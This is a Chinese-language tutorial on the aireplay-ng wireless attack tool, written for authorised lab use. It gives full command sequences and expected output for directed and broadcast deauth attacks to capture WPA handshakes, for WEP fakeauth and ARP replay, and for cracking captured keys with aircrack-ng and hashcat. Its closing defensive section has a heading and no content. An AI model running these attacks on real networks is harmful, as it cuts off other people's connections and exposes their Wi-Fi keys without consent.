# aireplay-ng（802.11 帧注入与攻击）

> **一句话**：向无线网络注入伪造的 802.11 帧——测试注入能力、用 deauth 逼客户端重连以便抓握手、用 ARP 重放加速 WEP 的 IV 收集。
> **分类**：无线攻击 ｜ **Kali 包**：`aircrack-ng` ｜ **官方文档**：<https://www.aircrack-ng.org/doku.php?id=aireplay-ng>

## 1. 它解决什么问题

[airodump-ng](airodump-ng.md) 只会**听**。而实际抓包中你会遇到两个它解决不了的现实问题：

| 问题 | aireplay-ng 的解法 |
| --- | --- |
| **客户端的握手早就发生完了，你事后才到现场** | **deauth 攻击**（`--deauth`）：以 AP 的名义把客户端踢下线，客户端自动重连 → 产生新握手 → 你就能抓到 |
| **不知道这块网卡能不能注入** | **注入测试**（`--test`）：发一个探测请求看有没有回应，**这是唯一可靠的验证方法** |
| **WEP 需要几万个 IV，但网络太闲** | **ARP 重放**（`--arpreplay`）：捕获一个 ARP 包后反复重放，强迫 AP 产生大量新 IV |
| 目标有多个客户端，需要伪造通信 | 各种认证/分片/Caffe-Latte 攻击（多为 WEP 时代遗留） |

**核心区分**：

| | airodump-ng | aireplay-ng |
| --- | --- | --- |
| 行为 | **纯被动**（不发射） | **主动**（发射伪造帧） |
| 网络层可检测性 | ❌ 不可检测 | ✅ **可检测**（这就是 WIDS 存在的理由） |
| 所需硬件能力 | 只要监听 | **必须有注入能力** |

**最重要的一点**：`--deauth` 会**中断他人的网络连接**。即使只是几秒钟，在多数司法辖区也构成干扰通信。**只能用于你自己拥有的网络**（详见文末法律章节）。

## 2. 工作原理

### 2.1 为什么需要「注入」这个能力

普通网卡驱动只允许你发送「合法的」帧——IP 包、正常的关联请求等。而 aireplay-ng 需要发送**任意构造的 802.11 管理帧和/或数据帧**，例如：

- 伪造一个 **deauthentication 帧**，源地址写成 AP 的 MAC；
- 重放一个**捕获到的加密 ARP 包**；
- 发送精心构造的**分片帧**用于恢复 keystream。

这需要网卡固件与驱动支持 **raw 帧注入（raw frame injection，也叫 monitor mode injection / radiotap injection）**。

**关键结论**：**「支持监听模式」≠「支持注入」**。这是无线攻防中最常见的认知误区。

| 网卡 | 监听 | 注入 |
| --- | --- | --- |
| Atheros AR9271 | ✅ | ✅ |
| Ralink RT3070 / RT3572 | ✅ | ✅ |
| Realtek RTL8812AU / RTL8814AU | ✅ | ✅ |
| **多数 Intel 内置网卡** | ✅ | ❌ **或严重受限** |
| 多数 Broadcom | ❌ | ❌ |

**验证注入能力的唯一可靠方法就是 `aireplay-ng --test`**（见场景 1）。

### 2.2 deauth 攻击的原理

`deauthentication`（去认证）和 `disassociation`（去关联）是 802.11 的**管理帧**，用来通知对方「我要断开连接了」。

**802.11 规范在原始设计中没有对这些管理帧做认证**（后来 802.11w/PMF 才补上）。这意味着：

```
任何人都可以伪造一个源地址为 AP 的 deauth 帧 → 客户端会照做（断开连接）
```

**deauth 攻击的完整流程**：

```text
             攻击者（你）                         AP
                 │                                │
                 │  (1) 监听，确认目标 BSSID 与信道  │
                 │                                │
    [客户端 STA]─┼────────────────────────────────┤
                 │                                │
                 │  (2) 伪造 deauth，src=AP_MAC    │
                 │       dst=STA_MAC              │
                 ├───────────────► STA            │
                 │                                │
                 │  (3) 客户端断线                 │
                 │                                │
                 │  (4) 客户端自动重连             │
    [客户端 STA]─┼─────── Association ───────────►│
                 │                                │
                 │  (5) ★ 四次握手 ← 你要抓的      │
                 │◄────────── EAPOL ─────────────►│
                 │                                │
                 │  (6) airodump-ng 显示           │
                 │      "WPA handshake: AA:BB:..." │
```

**为什么有效**：

- Linux 的 `wpa_supplicant`、Windows 的 WLAN AutoConfig、Android/iOS 在断线后都会**自动尝试重连**；
- 重连必然产生新的四次握手；
- 所以你只需要发几个 deauth，剩下的客户端会「帮你」完成。

**关键点：发几个就够，不要一直发**。

- 5~10 个 deauth 通常足够触发重连；
- 持续狂发 deauth 会导致客户端反复断连重连，**形成事实上的拒绝服务**——这既是技术问题也是法律问题；
- 客户端重连后如果又被踢掉，它可能进入退避状态，**反而更难抓到握手**。

**验证是否生效**：`aireplay-ng` 会输出 ACK 数量。

```
Sending 64 directed DeAuth (code 7). STMAC: [12:34:56:78:9A:BC] [ 8|14 ACKs]
                                                                   ↑
                                                     收到的 ACK。>0 = 注入成功
```

**ACK 数为 0 说明注入失败**（不是「客户端没反应」，而是**帧根本没发出去**）。

### 2.3 deauth 的两种模式

| 模式 | 命令 | 效果 |
| --- | --- | --- |
| **定向（directed）** | `--deauth 5 -a <AP> -c <CLIENT>` | 只针对某个客户端。**更精准，影响面小，推荐** |
| **广播（broadcast）** | `--deauth 5 -a <AP>` | 踢掉所有客户端。**影响面大，会中断整个网络** |

**优先用定向**：把 `-c` 写上目标客户端 MAC。这不仅影响面小，触发的手握也更可控。

### 2.4 802.11w / PMF —— deauth 的克星

**管理帧保护（Management Frame Protection, MFP / 802.11w / PMF）** 为管理帧加上了**加密和完整性校验**：

| | 无 PMF | 有 PMF |
| --- | --- | --- |
| deauth 帧 | 明文，任何人都能伪造 | 带 MIC，**伪造的帧会被客户端直接丢弃** |
| deauth 攻击 | ✅ 有效 | ❌ **无效** |
| WPA3 | — | **强制启用** |
| WPA2 | 可选（`802.11w` 选项） | — |

**结论**：

> 如果目标启用了 PMF，**deauth 攻击完全失效**。此时你只能：
> 1. 被动等待客户端自然产生握手（比如它自己重连、或漫游）；
> 2. 改用 **PMKID** 攻击（不需要 deauth）。

**这是蓝队最有效的一招**（见第 9 节）。

### 2.5 WEP 时代的攻击模式（了解即可）

以下模式在设计时都是为了破解 **WEP**。2026 年 WEP 已基本绝迹，但它们有助于理解：

| 模式 | 数字 | 原理 |
| --- | --- | --- |
| **Fakeauth**（伪认证） | `-1` | 与开放系统认证的 AP 建立关联，是后续注入的前提 |
| **Interactive**（交互式选包） | `-2` | 从监听到的包里手动挑选要重放的帧 |
| **ARP Replay**（ARP 重放） | `-3` | **WEP 攻击的主力**：捕获到一个加密 ARP 包后反复重放。AP 每次都会用新 IV 重新加密并转发 → **每次重放产生一个新的 IV**。这是把 IV 收集速率从「自然流量」提升到「每秒几百个」的关键 |
| **ChopChop** | `-4` | 逐字节破解 WEP 包，解密一个包并恢复 keystream |
| **Fragmentation** | `-5` | 通过分片获得 PRGA（keystream），用它构造任意包 |
| **Caffe-Latte** | `-6` | 向客户端发伪造的 ARP 请求，客户端回复产生新 IV。**不需要与 AP 关联** |
| **Cfrag** | `-7` | 针对客户端的分片攻击 |
| **MigMode** | `-8` | 攻击「WPA 迁移模式」（同时开 WEP 和 WPA 的 AP） |
| **Test** | `-9` | **注入能力与信号质量测试** |

**ARP 重放的完整链条**：

```text
1. 监听目标（airodump-ng --ivs）
2. aireplay-ng --fakeauth 0 -a <AP>  （与 AP 建立伪关联）
3. 等待捕获一个 ARP 包
   → aireplay-ng 会提示 "Found ARP packet"
4. aireplay-ng --arpreplay -b <AP> -h <你的MAC>
   → 反复重放，每秒产生几百个新 IV
5. 收集到约 4 万个 IV 后，aircrack-ng 用 PTW 攻击恢复密钥
6. 整个过程通常 1~3 分钟
```

### 2.6 注入测试（`--test`）的原理

```
1. aireplay-ng 发送一批 Probe Request / 认证请求
2. 统计收到的响应
3. 报告每秒钟收到多少响应，以及信号质量
```

**输出解读**：

```
14:30:15  Trying broadcast probe requests...
14:30:17  No Answer...
14:30:17  Found 1 AP

14:30:17  Trying directed probe requests...
14:30:17  45:67:89:AB:CD:EF - channel: 6 - 'lab-test'
14:30:19  Ping (min/avg/max): 1.762ms/4.638ms/9.316ms Power: -42.15
14:30:19  30/30: 100%
```

| 输出 | 含义 |
| --- | --- |
| `No Answer...` | 没有收到任何响应 |
| `Ping (min/avg/max)` | 往返时延 |
| `Power: -42.15` | 信号强度 |
| `30/30: 100%` | **收到了 30 个响应中的 30 个 = 100%，注入完全正常** |
| `0/30: 0%` | **注入失败** |

**判读标准**：

| 结果 | 结论 |
| --- | --- |
| `100%` | ✅ 注入完美 |
| `> 60%` | ⚠️ 可用，但会丢一些帧 |
| `< 30%` | ⚠️ 很不稳定，抓握手会很困难 |
| `0%` | ❌ **注入不工作**。换网卡或换驱动 |

## 3. 安装与快速上手

aireplay-ng 随 `aircrack-ng` 一起安装：

```bash
sudo apt install aircrack-ng
aireplay-ng --help
```

**最短工作流**：

```bash
# 0) 前置：airmon-ng 切监听模式，airodump-ng 侦察
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon            # 记下目标 BSSID、信道、客户端 MAC

# 1) 先测注入能力（非常重要，别跳过）
sudo aireplay-ng --test wlan0mon

# 2) 锁信道抓包（另一个终端）
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /tmp/cap wlan0mon

# 3) 定向 deauth（只针对一个客户端）
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 12:34:56:78:9A:BC wlan0mon
```

## 4. 核心参数详解

### 4.1 攻击模式（核心）

| 参数 | 数字 | 作用 | 使用建议 |
| --- | --- | --- | --- |
| `--deauth count` | `-0` | 发送 `count` 个 deauth 帧 | **抓握手的主力**。用 `-c` 定向；5~10 个就够 |
| `--fakeauth delay` | `-1` | 伪认证（与 AP 建立关联） | WEP 攻击的前提。`delay` = 重认证间隔秒数，`0` 表示只做一次 |
| `--interactive` | `-2` | 交互式选包后重放 | WEP 调试用 |
| `--arpreplay` | `-3` | 反复重放捕获的 ARP 包 | **WEP 提速主力** |
| `--chopchop` | `-4` | 逐字节解密 WEP 包 | WEP 攻击（较慢） |
| `--fragment` | `-5` | 分片攻击获得 PRGA | WEP 攻击（较快） |
| `--caffe-latte` | `-6` | 向客户端索取新 IV | **不需要与 AP 关联**，客户端多时好用 |
| `--cfrag` | `-7` | 针对客户端的分片攻击 | WEP |
| `--migmode` | `-8` | 攻击 WPA 迁移模式 | 罕见 |
| `--test` | `-9` | **注入能力与质量测试** | ⭐ **每次开始前必做** |

### 4.2 过滤选项（指定目标）

| 参数 | 作用 | 使用建议 |
| --- | --- | --- |
| `-b <bssid>` | AP 的 MAC 地址 | **几乎每个命令都要** |
| `-d <dmac>` | 目的 MAC | 过滤/指定目的地址 |
| `-s <smac>` | 源 MAC | 过滤/指定源地址 |
| `-m <len>` | 最小包长度 | 过滤噪声 |
| `-n <len>` | 最大包长度 | 过滤噪声 |
| `-u <type>` | 帧控制的 type 字段 | 高级过滤 |
| `-v <subtype>` | 帧控制的 subtype 字段 | 高级过滤 |
| `-t <tods>` | 帧控制的 ToDS 位 | 高级过滤 |
| `-f <fromds>` | 帧控制的 FromDS 位 | 高级过滤 |
| `-w <iswep>` | 帧控制的 WEP 位 | 判断包是否加密 |
| `-D` | 禁用 AP 检测 | 罕见 |

### 4.3 重放选项

| 参数 | 作用 | 使用建议 |
| --- | --- | --- |
| `-x <nbpps>` | 每秒发送的包数 | WEP ARP 重放时用；**过高会干扰网络** |
| `-p <fctrl>` | 设置帧控制字（十六进制） | 高级 |
| `-a <bssid>` | 设置 AP 的 MAC | 与 `-b` 类似，用于重放场景 |
| `-c <dmac>` | 设置目的 MAC | **deauth 定向的关键参数** |
| `-h <smac>` | 设置源 MAC | ARP 重放时填你自己的 MAC |
| `-g <value>` | 环形缓冲区大小（默认 8） | 罕见 |
| `-F` | 选择第一个匹配的包 | 自动化 |

### 4.4 Fakeauth（`-1`）专属

| 参数 | 作用 |
| --- | --- |
| `-e <essid>` | 目标 AP 的 SSID |
| `-o <npckts>` | 每个 burst 的包数（0=自动，默认 1） |
| `-q <sec>` | 保活间隔秒数 |
| `-Q` | 发送重关联请求 |
| `-y <prga>` | 共享密钥认证用的 keystream |
| `-T <n>` | 重试 n 次后退出伪认证 |

### 4.5 ARP 重放（`-3`）专属

| 参数 | 作用 |
| --- | --- |
| `-j` | 注入 FromDS 包（某些 AP 需要） |

### 4.6 分片攻击（`-5`）专属

| 参数 | 作用 |
| --- | --- |
| `-k <IP>` | 分片中的目的 IP |
| `-l <IP>` | 分片中的源 IP |

### 4.7 测试（`-9`）专属

| 参数 | 作用 |
| --- | --- |
| `-B` | 启用码率测试（bitrate test） |

### 4.8 源选项

| 参数 | 作用 | 使用建议 |
| --- | --- | --- |
| `-i <iface>` | 从该接口抓包（**与注入接口不同时**） | 双网卡配置（一块收、一块发） |
| `-r <file>` | 从 pcap 文件提取包 | 离线分析/重放 |

### 4.9 杂项

| 参数 | 作用 | 使用建议 |
| --- | --- | --- |
| `-R` | 禁用 `/dev/rtc` | 罕见 |
| `--ignore-negative-one` | 忽略信道不匹配 | 老驱动报 `channel: -1` 时用 |
| `--deauth-rc <rc>` | **deauth 的 reason code**（0-254，默认 7） | 默认 7 = `Class 3 frame received from nonassociated station`。**蓝队可据此检测**（见第 9 节） |
| `--help` | 显示帮助 | — |

**关于 `--deauth-rc`**：不同 reason code 的行为略有差异：

| code | 含义 | 备注 |
| --- | --- | --- |
| `7` | Class 3 frame received from nonassociated STA | **工具默认值** |
| `1` | Unspecified reason | 伪装成「正常」的断连 |
| `2` | Previous authentication no longer valid | 有时对某些客户端更有效 |
| `15` | 4-way handshake timeout | 看起来像正常超时 |

**说明**：改变 reason code 有时能提高触发重连的成功率，但**同时这也是刻意规避检测的做法**。在授权测试中应使用默认值并在报告中说明；**不应以规避蓝队检测为目的调整它**。

## 5. 实战演练

**环境声明**：本节的 `--deauth` 与所有注入操作**只能对你自己的 Wi-Fi 网络与你自己的路由器执行**，或在有书面授权的测试目标 / 隔离实验室中执行。**deauth 会中断通信，对非自有网络使用属于违法行为**。场景 4 是完全被动的替代方案。

### 场景 1：注入能力测试（每次开始前必做）

**为什么必做**：如果网卡不能注入，后面所有 deauth 命令都会输出 `ACK = 0`，而你会以为是目标的问题，白白浪费几十分钟。

```bash
sudo aireplay-ng --test wlan0mon
```

**预期输出（注入正常）**

```
14:30:15  Trying broadcast probe requests...
14:30:17  No Answer...
14:30:17  Found 1 AP

14:30:17  Trying directed probe requests...
14:30:17  45:67:89:AB:CD:EF - channel: 6 - 'lab-test'
14:30:19  Ping (min/avg/max): 1.762ms/4.638ms/9.316ms Power: -42.15
14:30:19  30/30: 100%
```

**预期输出（注入失败）**

```
14:30:15  Trying broadcast probe requests...
14:30:17  No Answer...
14:30:17  Found 1 AP

14:30:17  Trying directed probe requests...
14:30:17  45:67:89:AB:CD:EF - channel: 6 - 'lab-test'
14:30:19  Ping (min/avg/max): 0ms/0ms/0ms Power: -100.00
14:30:19  0/30: 0%
```

**判读**：

| 结论 | 意义 |
| --- | --- |
| `30/30: 100%` | ✅ 注入完美，可以继续 |
| `> 60%` | ⚠️ 可用，抓握手可能要多试几次 |
| `< 30%` | ⚠️ 不稳定，考虑换信道/靠近 AP/换网卡 |
| `0/30: 0%` | ❌ **注入不工作**。换网卡或换驱动，后面做不了 |

**如果注入失败**，检查：

```bash
# 1) 驱动来源（V=厂商驱动，S=staging，都可能不支持注入）
sudo airmon-ng --verbose

# 2) 芯片组是否支持注入（上网查）
lsusb

# 3) 信道是否匹配
iw dev wlan0mon info | grep channel

# 4) 是否使用老驱动
dmesg | grep -i -E 'ath9k|rt2800|rtl8|iwlwifi' | tail -20
```

### 场景 2：deauth 抓 WPA 握手（核心流程）

**目标**：你自己的路由器，SSID `lab-test`，BSSID `AA:BB:CC:DD:EE:FF`，信道 6，已有一个客户端（你的手机）连着。

**步骤 1：准备 —— 先侦察记下参数**

```bash
sudo airodump-ng wlan0mon
```

从输出里记下：

- 目标 AP 的 `BSSID`：`AA:BB:CC:DD:EE:FF`
- 目标 AP 的 `CH`：`6`
- 客户端的 `STATION`：`12:34:56:78:9A:BC`

**步骤 2：锁信道，开始抓包（终端 A，保持运行）**

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /tmp/cap wlan0mon
```

**步骤 3：另一个终端（终端 B）发定向 deauth**

```bash
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 12:34:56:78:9A:BC wlan0mon
```

| 参数 | 含义 |
| --- | --- |
| `--deauth 5` | 发送 5 个 deauth 帧 |
| `-a AA:BB:CC:DD:EE:FF` | **源地址伪装成 AP 的 MAC** |
| `-c 12:34:56:78:9A:BC` | **目的地址是那个客户端**（定向模式） |
| `wlan0mon` | 发送用的接口 |

**预期输出**

```
14:35:22  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:FF) on channel 6
14:35:23  Sending 64 directed DeAuth (code 7). STMAC: [12:34:56:78:9A:BC] [ 8|14 ACKs]
```

**关键解读**：

| 部分 | 含义 |
| --- | --- |
| `Waiting for beacon frame` | 先确认 AP 在线且信道正确 |
| `Sending 64 directed DeAuth (code 7)` | 实际发送了 64 个帧（**注意：`--deauth 5` 会发 5 轮，每轮 64 帧**） |
| `[ 8\|14 ACKs]` | 收到 8 个 ACK（14 是预期的广播 ACK 数）→ **注入成功** |

**如果 ACK 数为 0** → 注入失败，回到场景 1 诊断。

**步骤 4：观察终端 A**

```
 CH  6 ][ Elapsed: 38 s ][ 2026-09-15 14:35 ][ WPA handshake: AA:BB:CC:DD:EE:FF
```

**看到 `WPA handshake:` 就成功了**。按 `Ctrl+C` 停止抓包。

**步骤 5：如果第一次没成功**

| 情况 | 尝试 |
| --- | --- |
| 客户端没重连 | 再发一次 deauth（但**不要连续狂发**） |
| 只抓到握手的一半 | 再发一次；airodump 会累积 EAPOL 帧，两次的帧可能凑齐 |
| 一直抓不到 | 检查客户端是否已下线（`airodump-ng` 的客户端表）；客户端可能离 AP 太远 |
| 客户端有 PMF | deauth 无效 → **只能用 PMKID 或被动等待** |

**步骤 6：验证并破解**

```bash
# 检查抓到的内容
aircrack-ng /tmp/cap-01.cap

# 破解
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF /tmp/cap-01.cap

# 或导出给 hashcat（GPU 更快）
hcxpcapngtool -o /tmp/wifi.22000 /tmp/cap-01.cap
hashcat -m 22000 /tmp/wifi.22000 /usr/share/wordlists/rockyou.txt -O
```

### 场景 3：广播 deauth（不推荐，但要知道区别）

```bash
# ⚠️ 会踢掉目标网络上的所有客户端
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

**对比定向模式**：

| | 定向（`-c`） | 广播（无 `-c`） |
| --- | --- | --- |
| 影响范围 | 一个客户端 | **整个网络的所有客户端** |
| 对网络的影响 | 小（一个设备掉线几秒） | **大（全网络中断）** |
| 触发握手的概率 | 取决于该客户端是否重连 | 高（总有一个会重连） |
| 检测难度 | 较难（噪声小） | 容易（流量突增） |
| 推荐度 | ⭐ **推荐** | ⚠️ 仅在必要时 |

**实务建议**：**永远优先用定向模式**。如果你能列出客户端表，就能选一个最活跃的定向踢。这既减少了对他人的影响，也更符合授权的「最小影响」原则。

### 场景 4：无需注入的替代方案（推荐给初学者）

**如果你没有支持注入的网卡，或者不想发射任何帧**，仍然可以完成大部分学习：

**方案 A：等待自然握手**

```bash
# 长时间挂着抓包，等客户端自然重连、开机、漫游
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /tmp/cap wlan0mon
# 挂几小时，期间正常使用你的设备（开关 Wi-Fi、重启手机）
```

**方案 B：用 PMKID（主动但不需要 deauth）**

```bash
sudo hcxdumptool -i wlan0mon -o /tmp/dump.pcapng --enable_status=1
hcxpcapngtool -o /tmp/hash.22000 /tmp/dump.pcapng
hashcat -m 22000 /tmp/hash.22000 /usr/share/wordlists/rockyou.txt
```

**方案 C：用已有的抓包文件练习（完全被动）**

```bash
# 从 `-r` 参数读文件，不发射任何东西
sudo aireplay-ng -r /tmp/cap-01.cap --deauth 0 ...   # 不推荐用于离线
# 更好的做法是直接用 aircrack-ng / tshark 分析
aircrack-ng /tmp/cap-01.cap
tshark -r /tmp/cap-01.cap -Y 'eapol' -V | head -60
```

**方案 D：自己造一个「客户端重连」**

如果你有第二台设备（你自己的手机/笔记本）连着你的路由器：

```text
1. 挂上 airodump-ng 抓包
2. 把第二台设备的 Wi-Fi 关掉再打开
3. 它会自然完成一次完整的四次握手
4. 抓到！
```

**这是最优雅的方案**——**不需要任何注入**，只用一个正常操作就能产生握手。

### 场景 5：WEP 的 ARP 重放（原理演示）

> **前提**：你需要一个自己的 WEP 路由器。**2026 年基本买不到**，所以这一节主要是原理演示。如果你有旧设备，可以在隔离环境中尝试。

**步骤 1：锁信道抓 IV**

```bash
sudo airodump-ng --ivs -w /tmp/wep -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
```

**步骤 2：伪认证（与 AP 建立关联）**

```bash
sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -e lab-wep -h 00:C0:CA:xx:xx:xx wlan0mon
```

**预期输出**

```
14:40:01  Sending Authentication Request (Open System) [ACK]
14:40:01  Authentication successful
14:40:01  Sending Association Request [ACK]
14:40:01  Association successful :-) (AID: 1)
```

`Association successful` = 成功。

**步骤 3：ARP 重放（另一个终端）**

```bash
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h 00:C0:CA:xx:xx:xx wlan0mon
```

**预期输出**

```
14:41:10  Waiting for beacon frame...
14:41:12  Found ARP packet
14:41:12  Read 68 bytes from file...
14:41:13  Sending ARP request. [ACK]
14:41:13  Sending ARP request. [ACK]
14:41:13  Sending ARP request. [ACK]
...
```

**关键点**：

- `Found ARP packet` = 捕获到了一个可重放的加密 ARP 包；
- 之后**每个重放的包都会让 AP 生成一个新的 IV**；
- 观察终端 1 的 `#Data` 列会**飞快增长**（每秒几百个）。

**步骤 4：IV 够了就破解**

```bash
# 大约需要 4 万个 IV（PTW 攻击）
aircrack-ng -b AA:BB:CC:DD:EE:FF /tmp/wep-01.ivs
```

**预期输出**

```
                               Aircrack-ng 1.7

      [00:01:23] Tested 41223 keys (got 42318 IVs)

   KB    depth   byte(vote)
    0    0/  1   1B( 512) 4F( 412) ...
    ...
                           KEY FOUND! [ 1A:2B:3C:4D:5E ]
      Decrypted correctly: 100%
```

**`KEY FOUND!` + `Decrypted correctly: 100%` = 完全成功。**

**要点总结**：

| 步骤 | 作用 |
| --- | --- |
| `--fakeauth` | 让你能注入（AP 只接受已关联的客户端的包） |
| `--arpreplay` | 把 IV 收集速率从「自然流量」提升到「每秒几百」 |
| `--ivs` 抓包 | 只存 IV，文件小 |
| 4 万 IV + PTW | 恢复密钥 |

**再次强调**：WEP 在 2026 年已完全淘汰。如果你在真实环境中发现 WEP，**那是需要立刻上报的高危配置问题**，而不是「有趣的攻击目标」。

## 6. 输出解读

### deauth 输出

```
14:35:22  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:FF) on channel 6
14:35:23  Sending 64 directed DeAuth (code 7). STMAC: [12:34:56:78:9A:BC] [ 8|14 ACKs]
```

| 部分 | 含义 | 判读 |
| --- | --- | --- |
| `Waiting for beacon frame` | 先等 AP 的 Beacon，确认信道与可达性 | 一直卡在这里 = 信道不对或 AP 太远 |
| `Sending 64 directed DeAuth` | 每轮 64 个帧，共 `count` 轮 | 正常 |
| `STMAC: [12:34:56:78:9A:BC]` | 目标客户端 | 定向模式才有 |
| `code 7` | reason code | 可用 `--deauth-rc` 改（不建议为规避检测而改） |
| `[ 8\|14 ACKs]` | **收到 8 个 ACK** | **> 0 = 注入成功**；= 0 = 注入失败 |

**判读准则**：

```
ACK > 0      → 帧发出去了（注入正常），接下来看 airodump 有没有抓到握手
ACK = 0      → 注入失败，帧根本没发出去 → 回场景 1 诊断
```

**重要区别**：`ACK > 0` **只说明帧发出去了**，不代表客户端一定重连了。ACK 是**无线链路层的确认**（由网卡固件产生）。

### 注入测试输出

| 输出 | 含义 |
| --- | --- |
| `Trying broadcast probe requests...` | 先试广播探测 |
| `No Answer...` | 广播探测无响应（正常，很多 AP 不响应广播探测） |
| `Found N AP` | 找到 N 个 AP |
| `Trying directed probe requests...` | 试定向探测（更可靠） |
| `Ping (min/avg/max): ... Power: ...` | 时延与信号强度 |
| `30/30: 100%` | **注入质量：收到的响应数 / 发送数** |

### 伪认证输出

| 输出 | 含义 |
| --- | --- |
| `Sending Authentication Request (Open System) [ACK]` | 发送认证请求并收到链路层 ACK |
| `Authentication successful` | ✅ 认证通过 |
| `Association successful :-) (AID: 1)` | ✅ 关联成功 |
| `Got a deauthentication packet!` | 被 AP 踢了（可能因为 MAC 过滤） |

### ARP 重放输出

| 输出 | 含义 |
| --- | --- |
| `Found ARP packet` | ✅ 捕获到可重放的 ARP |
| `Sending ARP request. [ACK]` | 正在重放，每次产生一个新 IV |
| `No ARP packet found` | 网络太闲，没有 ARP 流量 → 可以先 ping 一下广播地址 |

### 完整工作流的成功判据

| 环节 | 成功标志 |
| --- | --- |
| 注入 | `--test` 显示 > 60% |
| deauth | `[ N\|M ACKs]` 中 N > 0 |
| 抓握手 | airodump 右上角出现 `WPA handshake:` |
| 抓包文件 | `aircrack-ng file.cap` 显示 `Number of EAPOL candidates: 1` |
| 破解 | `KEY FOUND! [ ... ]` |

**下一步**：

| 情况 | 动作 |
| --- | --- |
| 抓到握手 | 用 [aircrack-ng](aircrack-ng.md) 或 [hashcat](../04-口令攻击/hashcat.md) 破解 |
| 注入失败 | 换网卡（见 [airmon-ng](airmon-ng.md) 的芯片组表） |
| deauth 无效但注入正常 | **目标启用了 PMF** → 改用 PMKID |
| 有客户端但一直抓不到 | 用 `-c` 精确指定客户端；靠近 AP；检查 `RXQ` |

## 7. 与其他工具配合

```text
[airmon-ng start] → wlan0mon
        ↓
[aireplay-ng --test] ← 必做的注入能力检查
        ↓
[airodump-ng 侦察] → 记下 BSSID / CH / 客户端 MAC
        ↓
[airodump-ng -c <ch> --bssid <bssid> -w cap]   ←──┐
        ↑                                        │
[aireplay-ng --deauth 5 -a <ap> -c <client>]  ───┘  （触发重连）
        ↓
[WPA handshake 出现] → Ctrl+C
        ↓
   ┌────┴──────────────────────────┐
   ↓                               ↓
[aircrack-ng 破解]         [hcxpcapngtool → hashcat -m 22000]
   ↓                               ↓
[airdecap-ng 解密]          [GPU 破解]

──────────────── WEP 分支 ────────────────
[airodump-ng --ivs] → [aireplay-ng --fakeauth] → [aireplay-ng --arpreplay]
        ↓                                              ↓
   IV 飞涨 ──────────────────────────────────────► [aircrack-ng 破解]
```

| 组合 | 说明 |
| --- | --- |
| **[airmon-ng](airmon-ng.md) → aireplay-ng** | 必须先切监听模式 |
| **aireplay-ng → [airodump-ng](airodump-ng.md)** | deauth 触发重连，airodump 抓包 —— **最经典的组合** |
| **aireplay-ng → [aircrack-ng](aircrack-ng.md)** | WEP 的 ARP 重放加速 IV 收集 |
| **aireplay-ng → [hashcat](../04-口令攻击/hashcat.md)** | 间接：deauth 抓到的握手 → 22000 格式 → GPU |
| **[wifite](wifite.md)** | 内部自动调用 aireplay-ng 做 deauth |
| **[bettercap](bettercap.md)** | `wifi.deauth` 模块提供等价的 deauth 能力 |
| **[kismet](kismet.md)** | **作为蓝队工具**：检测 deauth 洪泛 |

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
| --- | --- | --- |
| **ACK 数为 0** | **注入失败**——最常见的问题 | `aireplay-ng --test` 诊断；换网卡；检查驱动来源（`airmon-ng --verbose` 看前缀 `V`/`S`） |
| `--test` 显示 `0/30: 0%` | 网卡不支持注入 | **换网卡**（Intel 内置网卡最常见的坑） |
| `Waiting for beacon frame` 一直卡住 | 信道不匹配、AP 太远、或 BSSID 写错 | 核对 `airodump-ng` 显示的 `CH`；靠近 AP |
| `No such BSSID available` | BSSID 拼错或 AP 不在范围内 | 重新侦察 |
| `ERROR: Could not determine current channel` | 网卡信道未同步 | 加 `--ignore-negative-one`；或 `iw dev wlan0mon set channel 6` |
| deauth 后 airodump **还是没抓到握手** | ① 目标启用了 **PMF（802.11w）** → deauth 被忽略；② 客户端没有自动重连；③ 信道不对 | 检查 AP 是否支持/启用了 PMF；改用 **PMKID**；再发一次 deauth |
| 客户端断线后再也不连了 | 发了太多 deauth，客户端进入退避 | **停止发**，等几分钟；下次只发 3~5 个 |
| 整个网络中断了很久 | 用了**广播 deauth** 且发太多 | 改定向模式 `-c`；减少 count |
| `Found ARP packet` 一直不出现（WEP） | 网络太闲，没有 ARP 流量 | 在网络上产生流量（`ping -b <广播地址>` 或从别的设备访问） |
| `--fakeauth` 报 `Association failed` | AP 有 MAC 过滤，或信号太差 | 检查路由器是否开了 MAC 白名单 |
| 抓到的握手破解不出来 | 口令不在字典里 | 换字典；用 [cewl](../04-口令攻击/cewl.md)/[crunch](../04-口令攻击/crunch.md)；用 hashcat GPU |
| 虚拟机里注入不工作 | USB 直通问题，或虚拟化层不支持 raw 注入 | 推荐**物理机 Kali + USB 网卡** |
| `-x` 参数设太高导致网络严重拥塞 | 每秒重放包数过多 | 降到 `-x 100` 以下 |
| 一切正常但 airodump 的 `RXQ` 很低 | 网卡在跳频（两个进程抢网卡） | 确认只有一个 airodump 在跑；加 `-c` |

### 一张排错决策图

```text
deauth 后抓不到握手
│
├─ ACK = 0 ?
│    → 注入失败 → aireplay-ng --test → 换网卡 / 换驱动
│
├─ ACK > 0，但客户端没重连？
│    ├─ 目标启用了 PMF（802.11w）？
│    │    → deauth 无效 → 改用 PMKID（hcxdumptool）
│    ├─ 客户端已经离线？
│    │    → 换一个客户端，或等它上线
│    ├─ 客户端离 AP 太远（收不到 deauth）？
│    │    → 靠近 AP 再试
│    └─ deauth 发太多了，客户端在退避？
│         → 停手，等几分钟，改用 3~5 个
│
├─ 客户端重连了，但 airodump 只抓到一半？
│    → 信道没锁定（加 -c）
│    → 多发一次 deauth，累积 EAPOL 帧
│    → wpaclean / aircrack-ng 检查 EAPOL candidates
│
└─ 抓到完整握手但破解不出？
     → 字典问题 → 换字典 / 加规则 / 上 hashcat
```

## 9. 防御视角（蓝队）

